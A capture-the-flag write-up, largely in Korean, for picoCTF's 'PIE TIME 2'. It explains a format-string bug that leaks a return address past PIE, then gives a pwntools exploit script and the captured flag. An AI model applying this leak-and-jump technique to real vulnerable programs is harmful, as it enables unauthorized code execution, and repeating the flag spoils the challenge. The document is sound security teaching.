# [PIE TIME 2](https://play.picoctf.org/practice/challenge/491?category=6&originalEvent=74&page=1)
<br />

**Description:**
> Can you try to get the flag? I'm not revealing anything anymore!!
<br />

**Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
```
<br />

**Binary Protections:**
```yaml
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=89c0ed5ed3766d1b85809c2bef48b6f5f0ef9364, for GNU/Linux 3.2.0, not stripped

[*] '/home/kali/pico/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```
<br />
<br />

바이너리를 실행하면 입력을 받고, 이를 출력합니다. 이후 점프할 주소를 입력받고, 호출합니다. 소스코드를 보면 `printf(buffer)`를 사용하고 있는데, 이는 내부 주소 유출 및 특정 주소 조작 등을 할 수 있는 FSB 취약점이 발생합니다. 바이너리에는 PIE가 적용되어 있지만, 해당 취약점을 통해 `win`의 주소를 구할 수 있습니다.

우선 아래 과정을 통해 `RET`의 주소를 알아냅니다.

```asm
pwndbg> b *call_functions+121
Breakpoint 1 at 0x555555555340
pwndbg> r
...
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0   0x5555555552c7 call_functions
   1   0x555555555441 main+65
   2   0x7ffff7dedca8 __libc_start_call_main+120
   3   0x7ffff7dedd65 __libc_start_main+133
   4   0x5555555551ee _start+46
...
pwndbg> x/2gx $rbp
0x7fffffffe070: 0x00007fffffffe080      0x0000555555555441
pwndbg> x/a 0x0000555555555441
0x555555555441 <main+65>:       0xfc35d00000000b8
```
디버깅으로 `call_functions` 의 `RET` 주소는 `0x555555555441`인 것을 알 수 있고, 주소의 마지막 3자리는 `441`입니다. 이제 `RET`의 주소를 알았으니, 오프셋을 특정할 수 있습니다.

```bash
./vuln
Enter your name:%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
0x561cc567f2a1.0xfbad2288.0x3a980d5f.0x561cc567f2df.(nil).0x7f523844ffd0.(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0xa70252e70252e.0x7ffd7882d340.0x1af3520c4ae5ad00.0x7ffd7882d340.0x561ca9576441.0x1.0x7f5238293ca8
 enter the address to jump to, ex => 0x12345:
```
```bash
$ ./vuln
Enter your name:%19$p
0x557dc4a2e441
 enter the address to jump to, ex => 0x12345:
```
`RET`의 오프셋은 `19` 입니다. 이제 `win`의 주소를 구할 수 있습니다.
```yaml
pwndbg> p win
$1 = {<text variable, no debug info>} 0x55555555536a <win>
pwndbg> p/x 0x555555555441 - 0x55555555536a
$2 = 0xd7
```
`RET`과 `win` 사이의 오프셋은 `0xd7` 입니다. 위 과정을 종합하여 공격 코드를 작성할 수 있습니다.

<br />

```python
from pwn import *

context.log_level = "error"

# p = process("./vuln")
p = remote("rescued-float.picoctf.net", 64714)

p.sendlineafter(b"Enter your name:", b"%19$p")
leak = int(p.recvline()[:-1],16)
win = leak - 0xd7

p.sendlineafter(b"0x12345:", hex(win).encode())
p.interactive()
```
```bash
$ python3 test.py
You won!
picoCTF{p13_5h0u1dn'7_134k_9d4030a3}

$
```

